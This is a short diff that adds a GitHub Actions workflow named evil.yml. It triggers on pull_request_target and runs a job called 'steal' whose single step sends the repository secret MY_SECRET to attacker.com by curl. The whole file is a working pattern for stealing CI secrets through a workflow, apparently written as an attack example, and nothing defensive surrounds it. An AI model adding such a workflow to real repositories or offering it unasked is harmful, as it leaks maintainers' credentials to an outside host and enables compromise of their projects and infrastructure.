@@ -1,0 +1,10 @@
+# .github/workflows/evil.yml
+
+on:
+  pull_request_target:
+
+jobs:
+  steal:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl https://attacker.com/?secret=${{ secrets.MY_SECRET }}
